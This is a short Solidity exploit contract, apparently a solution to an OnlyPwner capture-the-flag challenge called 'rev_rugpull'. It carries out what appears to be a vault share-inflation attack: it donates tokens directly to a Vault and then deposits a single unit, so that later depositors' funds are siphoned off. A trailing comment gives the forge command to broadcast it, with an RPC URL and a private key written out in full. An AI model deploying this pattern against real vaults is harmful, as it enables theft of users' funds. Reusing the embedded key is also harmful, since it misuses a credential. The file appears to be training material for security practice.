// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vault.sol";
import "./MintableERC20.sol";

contract exploit {
    Vault public target;
    MintableERC20 public token;

    constructor() {
        target = Vault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);
        token = MintableERC20(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
    }

    function ex() public {
        token.approve(address(target), 1);
        token.transfer(address(target), 8 ether);
        target.deposit(1);
    }
}

// forge script ./script/rev_rugpull.sol --rpc-url https://nodes.onlypwner.xyz/rpc/6cb89b90-60cd-4636-93c2-325e22748ea9 --private-key be0a5d9f38057fa406c987fd1926f7bfc49f094dc4e138fc740665d179e6a56a -vvvvvv --broadcast --priority-gas-price 0 --with-gas-price 0